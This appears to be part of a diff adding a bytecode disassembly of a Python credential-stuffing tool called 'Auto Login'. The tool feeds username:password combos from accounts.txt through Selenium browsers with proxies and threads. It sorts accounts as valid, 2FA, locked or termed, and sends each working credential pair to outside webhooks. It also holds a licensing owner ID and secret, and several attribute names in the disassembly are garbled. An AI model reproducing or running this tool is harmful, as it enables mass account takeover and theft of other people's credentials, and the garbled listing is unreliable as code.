+                5682    LOAD_CONST                      41: 'content'
+                5684    LOAD_CONST                      71: '[TERMED] - USERNAME: '
+                5686    LOAD_FAST                       10: username
+                5688    FORMAT_VALUE                    0
+                5690    LOAD_CONST                      43: ' - PASSWORD: '
+                5692    LOAD_FAST                       11: password
+                5694    FORMAT_VALUE                    0
+                5696    BUILD_STRING                    4
+                5698    BUILD_MAP                       1
+                5700    KW_NAMES                        44: ('json',)
+                5702    CALL                            2
+                5710    POP_TOP
+                5712    LOAD_GLOBAL                     101: NULL + removeallcombos
+                5722    LOAD_FAST                       10: username
+                5724    CALL                            1
+                5732    POP_TOP
+                5734    LOAD_GLOBAL                     29: NULL + open
+                5744    LOAD_CONST                      33: 'data.txt'
+                5746    LOAD_CONST                      34: 'a'
+                5748    CALL                            2
+                5756    BEFORE_WITH
+                5758    STORE_FAST                      16: file
+                5760    LOAD_FAST                       16: file
+                5762    LOAD_ATTR                       91 <INVALID>
+                5782    LOAD_FAST                       10: username
+                5784    FORMAT_VALUE                    0
+                5786    LOAD_CONST                      16: ':'
+                5788    LOAD_FAST                       11: password
+                5790    FORMAT_VALUE                    0
+                5792    LOAD_CONST                      35: '\n'
+                5794    BUILD_STRING                    4
+                5796    CALL                            1
+                5804    POP_TOP
+                5806    LOAD_CONST                      0: None
+                5808    LOAD_CONST                      0: None
+                5810    LOAD_CONST                      0: None
+                5812    CALL                            2
+                5820    POP_TOP
+                5822    JUMP_FORWARD                    12 (to 5848)
+                5824    PUSH_EXC_INFO
+                5826    WITH_EXCEPT_START
+                5828    POP_JUMP_IF_TRUE                1 (to 5832)
+                5830    RERAISE                         2
+                5832    POP_TOP
+                5834    POP_EXCEPT
+                5836    POP_TOP
+                5838    POP_TOP
+                5840    JUMP_FORWARD                    3 (to 5848)
+                5842    COPY                            3
+                5844    POP_EXCEPT
+                5846    RERAISE                         1
+                5848    LOAD_FAST                       8: driver
+                5850    LOAD_ATTR                       83 <INVALID>
+                5870    CALL                            0
+                5878    POP_TOP
+                5880    JUMP_BACKWARD                   1686 (to 2512)
+                5884    JUMP_FORWARD                    299 (to 6486)
+                5888    PUSH_EXC_INFO
+                5890    POP_TOP
+                5892    LOAD_GLOBAL                     80: testmode
+                5902    LOAD_CONST                      12: True
+                5904    COMPARE_OP                      40 (==)
+                5908    POP_JUMP_IF_FALSE               11 (to 5932)
+                5910    LOAD_GLOBAL                     65: NULL + print
+                5920    LOAD_CONST                      72: '[INVALID TERMED FRAME]: Unable to detect termed frame'
+                5922    CALL                            1
+                5930    POP_TOP
+                5932    NOP
+                5934    LOAD_FAST                       8: driver
+                5936    LOAD_ATTR                       69 <INVALID>
+                5956    LOAD_GLOBAL                     70: By
+                5966    LOAD_ATTR                       72 <INVALID>
+                5986    LOAD_CONST                      73: '//*[@id="right-navigation-header"]/div[2]/ul/div[2]/a/span[2]'
+                5988    CALL                            2
+                5996    LOAD_ATTR                       86 <INVALID>
+                6016    STORE_FAST                      23: usernamecheck
+                6018    LOAD_CONST                      12: True
+                6020    STORE_FAST                      12: endloop
+                6022    LOAD_GLOBAL                     65: NULL + print
+                6032    LOAD_CONST                      74: '[LOGGED IN ACCOUNT]: Username - '
+                6034    LOAD_FAST                       10: username
+                6036    FORMAT_VALUE                    0
+                6038    LOAD_CONST                      30: ' Password - '
+                6040    LOAD_FAST                       11: password
+                6042    FORMAT_VALUE                    0
+                6044    LOAD_CONST                      75: ' Current Name - '
+                6046    LOAD_FAST                       23: usernamecheck
+                6048    FORMAT_VALUE                    0
+                6050    BUILD_STRING                    6
+                6052    CALL                            1
+                6060    POP_TOP
+                6062    LOAD_GLOBAL                     29: NULL + open
+                6072    LOAD_CONST                      49: 'accounts/valid.txt'
+                6074    LOAD_CONST                      34: 'a'
+                6076    CALL                            2
+                6084    BEFORE_WITH
+                6086    STORE_FAST                      16: file
+                6088    LOAD_FAST                       16: file
+                6090    LOAD_ATTR                       91 <INVALID>
+                6110    LOAD_FAST                       10: username
+                6112    FORMAT_VALUE                    0
+                6114    LOAD_CONST                      16: ':'
+                6116    LOAD_FAST                       11: password
+                6118    FORMAT_VALUE                    0
+                6120    LOAD_CONST                      35: '\n'
+                6122    BUILD_STRING                    4
+                6124    CALL                            1
+                6132    POP_TOP
+                6134    LOAD_CONST                      0: None
+                6136    LOAD_CONST                      0: None
+                6138    LOAD_CONST                      0: None
+                6140    CALL                            2
+                6148    POP_TOP
+                6150    JUMP_FORWARD                    12 (to 6176)
+                6152    PUSH_EXC_INFO
+                6154    WITH_EXCEPT_START
+                6156    POP_JUMP_IF_TRUE                1 (to 6160)
+                6158    RERAISE                         2
+                6160    POP_TOP
+                6162    POP_EXCEPT
+                6164    POP_TOP
+                6166    POP_TOP
+                6168    JUMP_FORWARD                    3 (to 6176)
+                6170    COPY                            3
+                6172    POP_EXCEPT
+                6174    RERAISE                         1
+                6176    LOAD_GLOBAL                     95: NULL + requests
+                6186    LOAD_ATTR                       96 <INVALID>
+                6206    LOAD_GLOBAL                     102: validwebhook
+                6216    LOAD_CONST                      41: 'content'
+                6218    LOAD_CONST                      50: '[VALID] - USERNAME: '
+                6220    LOAD_FAST                       10: username
+                6222    FORMAT_VALUE                    0
+                6224    LOAD_CONST                      43: ' - PASSWORD: '
+                6226    LOAD_FAST                       11: password
+                6228    FORMAT_VALUE                    0
+                6230    LOAD_CONST                      51: ' @everyone'
+                6232    BUILD_STRING                    5
+                6234    BUILD_MAP                       1
+                6236    KW_NAMES                        44: ('json',)
+                6238    CALL                            2
+                6246    POP_TOP
+                6248    LOAD_GLOBAL                     101: NULL + removeallcombos
+                6258    LOAD_FAST                       10: username
+                6260    CALL                            1
+                6268    POP_TOP
+                6270    LOAD_FAST                       8: driver
+                6272    LOAD_ATTR                       83 <INVALID>
+                6292    CALL                            0
+                6300    POP_TOP
+                6302    LOAD_GLOBAL                     29: NULL + open
+                6312    LOAD_CONST                      33: 'data.txt'
+                6314    LOAD_CONST                      34: 'a'
+                6316    CALL                            2
+                6324    BEFORE_WITH
+                6326    STORE_FAST                      16: file
+                6328    LOAD_FAST                       16: file
+                6330    LOAD_ATTR                       91 <INVALID>
+                6350    LOAD_FAST                       10: username
+                6352    FORMAT_VALUE                    0
+                6354    LOAD_CONST                      16: ':'
+                6356    LOAD_FAST                       11: password
+                6358    FORMAT_VALUE                    0
+                6360    LOAD_CONST                      35: '\n'
+                6362    BUILD_STRING                    4
+                6364    CALL                            1
+                6372    POP_TOP
+                6374    LOAD_CONST                      0: None
+                6376    LOAD_CONST                      0: None
+                6378    LOAD_CONST                      0: None
+                6380    CALL                            2
+                6388    POP_TOP
+                6390    JUMP_FORWARD                    12 (to 6416)
+                6392    PUSH_EXC_INFO
+                6394    WITH_EXCEPT_START
+                6396    POP_JUMP_IF_TRUE                1 (to 6400)
+                6398    RERAISE                         2
+                6400    POP_TOP
+                6402    POP_EXCEPT
+                6404    POP_TOP
+                6406    POP_TOP
+                6408    JUMP_FORWARD                    3 (to 6416)
+                6410    COPY                            3
+                6412    POP_EXCEPT
+                6414    RERAISE                         1
+                6416    POP_EXCEPT
+                6418    JUMP_BACKWARD                   1955 (to 2512)
+                6422    PUSH_EXC_INFO
+                6424    POP_TOP
+                6426    LOAD_GLOBAL                     80: testmode
+                6436    LOAD_CONST                      12: True
+                6438    COMPARE_OP                      40 (==)
+                6442    POP_JUMP_IF_FALSE               11 (to 6466)
+                6444    LOAD_GLOBAL                     65: NULL + print
+                6454    LOAD_CONST                      76: '[INVALID LOGIN]: Unable to detect home frame'
+                6456    CALL                            1
+                6464    POP_TOP
+                6466    POP_EXCEPT
+                6468    JUMP_FORWARD                    3 (to 6476)
+                6470    COPY                            3
+                6472    POP_EXCEPT
+                6474    RERAISE                         1
+                6476    POP_EXCEPT
+                6478    JUMP_FORWARD                    3 (to 6486)
+                6480    COPY                            3
+                6482    POP_EXCEPT
+                6484    RERAISE                         1
+                6486    JUMP_BACKWARD                   2383 (to 1724)
+                6490    PUSH_EXC_INFO
+                6492    POP_TOP
+                6494    LOAD_GLOBAL                     65: NULL + print
+                6504    LOAD_CONST                      77: 'error'
+                6506    CALL                            1
+                6514    POP_TOP
+                6516    POP_EXCEPT
+                6518    JUMP_BACKWARD                   1985 (to 2552)
+                6522    COPY                            3
+                6524    POP_EXCEPT
+                6526    RERAISE                         1
+        [Code]
+            File Name: main.py
+            Object Name: getchecksum
+            Qualified Name: getchecksum
+            Arg Count: 0
+            Pos Only Arg Count: 0
+            KW Only Arg Count: 0
+            Stack Size: 5
+            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)
+            [Names]
+                'hashlib'
+                'md5'
+                'open'
+                'join'
+                'sys'
+                'argv'
+                'update'
+                'read'
+                'hexdigest'
+            [Locals+Names]
+                'md5_hash'
+                'file'
+                'digest'
+            [Constants]
+                None
+                ''
+                'rb'
+            [Disassembly]
+                0       RESUME                          0
+                2       LOAD_GLOBAL                     1: NULL + hashlib
+                12      LOAD_ATTR                       2: open
+                32      CALL                            0
+                40      STORE_FAST                      0: md5_hash
+                42      LOAD_GLOBAL                     5: NULL + open
+                52      LOAD_CONST                      1: ''
+                54      LOAD_ATTR                       7: read
+                74      LOAD_GLOBAL                     8: sys
+                84      LOAD_ATTR                       10 <INVALID>
+                104     CALL                            1
+                112     LOAD_CONST                      2: 'rb'
+                114     CALL                            2
+                122     STORE_FAST                      1: file
+                124     LOAD_FAST                       0: md5_hash
+                126     LOAD_ATTR                       13 <INVALID>
+                146     LOAD_FAST                       1: file
+                148     LOAD_ATTR                       15 <INVALID>
+                168     CALL                            0
+                176     CALL                            1
+                184     POP_TOP
+                186     LOAD_FAST                       0: md5_hash
+                188     LOAD_ATTR                       17 <INVALID>
+                208     CALL                            0
+                216     STORE_FAST                      2: digest
+                218     LOAD_FAST                       2: digest
+                220     RETURN_VALUE
+        'Auto Login'
+        '53TjlayTgI'
+        '22dae7a1180bb55d12d7492bc341a0968eb591cba8176396925c1015ea94c515'
+        '1.0'
+        (
+            'name'
+            'ownerid'
+            'secret'
+            'version'
+            'hash_to_check'
+        )
+    [Disassembly]
+        0       RESUME                          0
+        2       LOAD_CONST                      0: 0
+        4       LOAD_CONST                      1: ('webdriver',)
+        6       IMPORT_NAME                     0: selenium
+        8       IMPORT_FROM                     1: webdriver
+        10      STORE_NAME                      1: webdriver
+        12      POP_TOP
+        14      LOAD_CONST                      0: 0
+        16      LOAD_CONST                      2: ('By',)
+        18      IMPORT_NAME                     2: selenium.webdriver.common.by
+        20      IMPORT_FROM                     3: By
+        22      STORE_NAME                      3: By
+        24      POP_TOP
+        26      LOAD_CONST                      0: 0
+        28      LOAD_CONST                      3: ('Service',)
+        30      IMPORT_NAME                     4: selenium.webdriver.chrome.service
+        32      IMPORT_FROM                     5: Service
+        34      STORE_NAME                      6: ChromeService
+        36      POP_TOP
+        38      LOAD_CONST                      0: 0
+        40      LOAD_CONST                      4: ('Options',)
+        42      IMPORT_NAME                     7: selenium.webdriver.chrome.options
+        44      IMPORT_FROM                     8: Options
+        46      STORE_NAME                      8: Options
+        48      POP_TOP
+        50      LOAD_CONST                      0: 0
+        52      LOAD_CONST                      5: ('DesiredCapabilities',)
+        54      IMPORT_NAME                     9: selenium.webdriver.common.desired_capabilities
+        56      IMPORT_FROM                     10: DesiredCapabilities
+        58      STORE_NAME                      10: DesiredCapabilities
+        60      POP_TOP
+        62      LOAD_CONST                      0: 0
+        64      LOAD_CONST                      6: ('ThreadPool',)
+        66      IMPORT_NAME                     11: multiprocessing.pool
+        68      IMPORT_FROM                     12: ThreadPool
+        70      STORE_NAME                      12: ThreadPool
+        72      POP_TOP
+        74      LOAD_CONST                      0: 0
+        76      LOAD_CONST                      7: None
+        78      IMPORT_NAME                     13: json
+        80      STORE_NAME                      13: json
+        82      LOAD_CONST                      0: 0
+        84      LOAD_CONST                      7: None
+        86      IMPORT_NAME                     14: random
+        88      STORE_NAME                      14: random
+        90      LOAD_CONST                      0: 0
+        92      LOAD_CONST                      7: None
+        94      IMPORT_NAME                     15: os
+        96      STORE_NAME                      15: os
+        98      LOAD_CONST                      0: 0
+        100     LOAD_CONST                      7: None
+        102     IMPORT_NAME                     16: sys
+        104     STORE_NAME                      16: sys
+        106     LOAD_CONST                      0: 0
+        108     LOAD_CONST                      7: None
+        110     IMPORT_NAME                     17: requests
+        112     STORE_NAME                      17: requests
+        114     LOAD_CONST                      0: 0
+        116     LOAD_CONST                      7: None
+        118     IMPORT_NAME                     18: time
+        120     STORE_NAME                      18: time
+        122     LOAD_CONST                      0: 0
+        124     LOAD_CONST                      8: ('api',)
+        126     IMPORT_NAME                     19: keyauth
+        128     IMPORT_FROM                     20: api
+        130     STORE_NAME                      20: api
+        132     POP_TOP
+        134     LOAD_CONST                      0: 0
+        136     LOAD_CONST                      7: None
+        138     IMPORT_NAME                     21: hashlib
+        140     STORE_NAME                      21: hashlib
+        142     PUSH_NULL
+        144     LOAD_NAME                       22: open
+        146     LOAD_CONST                      9: 'config.json'
+        148     LOAD_CONST                      10: 'r'
+        150     CALL                            2
+        158     BEFORE_WITH
+        160     STORE_NAME                      23: jsonfile
+        162     PUSH_NULL
+        164     LOAD_NAME                       13: json
+        166     LOAD_ATTR                       48: removeallcombos
+        186     LOAD_NAME                       23: jsonfile
+        188     CALL                            1
+        196     STORE_NAME                      25: config
+        198     LOAD_NAME                       25: config
+        200     LOAD_CONST                      11: 'Auth'
+        202     BINARY_SUBSCR
+        206     STORE_NAME                      26: auth
+        208     LOAD_NAME                       26: auth
+        210     LOAD_CONST                      12: 'Key'
+        212     BINARY_SUBSCR
+        216     STORE_NAME                      27: key
+        218     LOAD_NAME                       26: auth
+        220     LOAD_CONST                      13: 'Captcha Key'
+        222     BINARY_SUBSCR
+        226     STORE_NAME                      28: captchakey
+        228     LOAD_NAME                       26: auth
+        230     LOAD_CONST                      14: 'Webhooks'
+        232     BINARY_SUBSCR
+        236     STORE_NAME                      29: webhooks
+        238     LOAD_NAME                       29: webhooks
+        240     LOAD_CONST                      15: 'Valid Accounts'
+        242     BINARY_SUBSCR
+        246     STORE_NAME                      30: validwebhook
+        248     LOAD_NAME                       29: webhooks
+        250     LOAD_CONST                      16: '2FA Accounts'
+        252     BINARY_SUBSCR
+        256     STORE_NAME                      31: webhook2fa
+        258     LOAD_NAME                       29: webhooks
+        260     LOAD_CONST                      17: 'Locked Accounts'
+        262     BINARY_SUBSCR
+        266     STORE_NAME                      32: webhooklock
+        268     LOAD_NAME                       29: webhooks
+        270     LOAD_CONST                      18: 'Confirm Idenity Accounts'
+        272     BINARY_SUBSCR
+        276     STORE_NAME                      33: webhookconfirm
+        278     LOAD_NAME                       29: webhooks
+        280     LOAD_CONST                      19: 'Termed Accounts'
+        282     BINARY_SUBSCR
+        286     STORE_NAME                      34: webhookterm
+        288     LOAD_NAME                       25: config
+        290     LOAD_CONST                      20: 'Main'
+        292     BINARY_SUBSCR
+        296     STORE_NAME                      35: main
+        298     LOAD_NAME                       35: main
+        300     LOAD_CONST                      21: 'Max Timeout'
+        302     BINARY_SUBSCR
+        306     STORE_NAME                      36: maxtimeout
+        308     LOAD_NAME                       35: main
+        310     LOAD_CONST                      22: 'Threads'
+        312     BINARY_SUBSCR
+        316     STORE_NAME                      37: threads
+        318     LOAD_NAME                       35: main
+        320     LOAD_CONST                      23: 'Thread Load Time'
+        322     BINARY_SUBSCR
+        326     STORE_NAME                      38: loadtime
+        328     LOAD_NAME                       35: main
+        330     LOAD_CONST                      24: 'Use Proxys'
+        332     BINARY_SUBSCR
+        336     STORE_NAME                      39: useproxys
+        338     LOAD_NAME                       35: main
+        340     LOAD_CONST                      25: 'Test Mode'
+        342     BINARY_SUBSCR
+        346     STORE_NAME                      40: testmode
+        348     LOAD_CONST                      7: None
+        350     LOAD_CONST                      7: None
+        352     LOAD_CONST                      7: None
+        354     CALL                            2
+        362     POP_TOP
+        364     PUSH_NULL
+        366     LOAD_NAME                       22: open
+        368     LOAD_CONST                      26: 'accounts.txt'
+        370     LOAD_CONST                      27: 'utf-8'
+        372     KW_NAMES                        28: ('encoding',)
+        374     CALL                            2
+        382     BEFORE_WITH
+        384     STORE_NAME                      41: file
+        386     LOAD_NAME                       41: file
+        388     LOAD_ATTR                       85 <INVALID>
+        408     CALL                            0
+        416     LOAD_ATTR                       87 <INVALID>
+        436     CALL                            0
+        444     STORE_NAME                      44: combonations
+        446     LOAD_CONST                      7: None
+        448     LOAD_CONST                      7: None
+        450     LOAD_CONST                      7: None
+        452     CALL                            2
+        460     POP_TOP
+        462     LOAD_NAME                       39: useproxys
+        464     LOAD_CONST                      29: True
+        466     COMPARE_OP                      40 (==)
+        470     POP_JUMP_IF_FALSE               34 (to 540)
+        472     PUSH_NULL
+        474     LOAD_NAME                       22: open
+        476     LOAD_CONST                      30: 'proxys.txt'
+        478     LOAD_CONST                      10: 'r'
+        480     CALL                            2
+        488     BEFORE_WITH
+        490     STORE_NAME                      41: file
+        492     LOAD_NAME                       41: file
+        494     LOAD_ATTR                       91 <INVALID>
+        514     CALL                            0
+        522     STORE_NAME                      46: proxies
+        524     LOAD_CONST                      7: None
+        526     LOAD_CONST                      7: None
+        528     LOAD_CONST                      7: None
+        530     CALL                            2
+        538     POP_TOP
+        540     LOAD_CONST                      31: <CODE> removecombo
+        542     MAKE_FUNCTION                   0
+        544     STORE_NAME                      47: removecombo
+        546     LOAD_CONST                      32: <CODE> removeallcombos
+        548     MAKE_FUNCTION                   0
+        550     STORE_NAME                      48: removeallcombos
+        552     LOAD_CONST                      33: <CODE> guesspasswords
+        554     MAKE_FUNCTION                   0
+        556     STORE_NAME                      49: guesspasswords
+        558     LOAD_CONST                      34: <CODE> getchecksum
+        560     MAKE_FUNCTION                   0
+        562     STORE_NAME                      50: getchecksum
+        564     PUSH_NULL
+        566     LOAD_NAME                       20: api
+        568     LOAD_CONST                      35: 'Auto Login'
+        570     LOAD_CONST                      36: '53TjlayTgI'
+        572     LOAD_CONST                      37: '22dae7a1180bb55d12d7492bc341a0968eb591cba8176396925c1015ea94c515'
+        574     LOAD_CONST                      38: '1.0'
+        576     PUSH_NULL
+        578     LOAD_NAME                       50: getchecksum
+        580     CALL                            0
+        588     KW_NAMES                        39: ('name', 'ownerid', 'secret', 'version', 'hash_to_check')
+        590     CALL                            5
+        598     STORE_NAME                      51: keyauthapp
+        600     LOAD_NAME                       51: keyauthapp
+        602     LOAD_ATTR                       105 <INVALID>
+        622     LOAD_NAME                       27: key
+        624     CALL                            1
+        632     POP_TOP
+        634     LOAD_NAME                       51: keyauthapp
+        636     LOAD_ATTR                       107 <INVALID>
+        656     CALL                            0
+        664     LOAD_CONST                      29: True
+        666     COMPARE_OP                      40 (==)
+        670     POP_JUMP_IF_FALSE               39 (to 750)
+        672     PUSH_NULL
+        674     LOAD_NAME                       12: ThreadPool
+        676     LOAD_NAME                       37: threads
+        678     CALL                            1
+        686     STORE_NAME                      54: pool
+        688     LOAD_NAME                       54: pool
+        690     LOAD_ATTR                       111 <INVALID>
+        710     LOAD_NAME                       49: guesspasswords
+        712     PUSH_NULL
+        714     LOAD_NAME                       56: list
+        716     PUSH_NULL
+        718     LOAD_NAME                       57: range
+        720     LOAD_NAME                       37: threads
+        722     CALL                            1
+        730     CALL                            1
+        738     CALL                            2
+        746     STORE_NAME                      58: tokens
+        748     RETURN_CONST                    7: None
+        750     RETURN_CONST                    7: None
+        752     PUSH_EXC_INFO
+        754     WITH_EXCEPT_START
+        756     POP_JUMP_IF_TRUE                1 (to 760)
+        758     RERAISE                         2
+        760     POP_TOP
+        762     POP_EXCEPT
+        764     POP_TOP
+        766     POP_TOP
+        768     JUMP_BACKWARD                   203 (to 364)
+        770     COPY                            3
+        772     POP_EXCEPT
+        774     RERAISE                         1
+        776     PUSH_EXC_INFO
+        778     WITH_EXCEPT_START
+        780     POP_JUMP_IF_TRUE                1 (to 784)
+        782     RERAISE                         2
+        784     POP_TOP
+        786     POP_EXCEPT
+        788     POP_TOP
+        790     POP_TOP
+        792     JUMP_BACKWARD                   166 (to 462)
+        794     COPY                            3
+        796     POP_EXCEPT
+        798     RERAISE                         1
+        800     PUSH_EXC_INFO
+        802     WITH_EXCEPT_START
+        804     POP_JUMP_IF_TRUE                1 (to 808)
+        806     RERAISE                         2
+        808     POP_TOP
+        810     POP_EXCEPT
+        812     POP_TOP
+        814     POP_TOP
+        816     JUMP_BACKWARD                   139 (to 540)
+        818     COPY                            3
+        820     POP_EXCEPT
+        822     RERAISE                         1
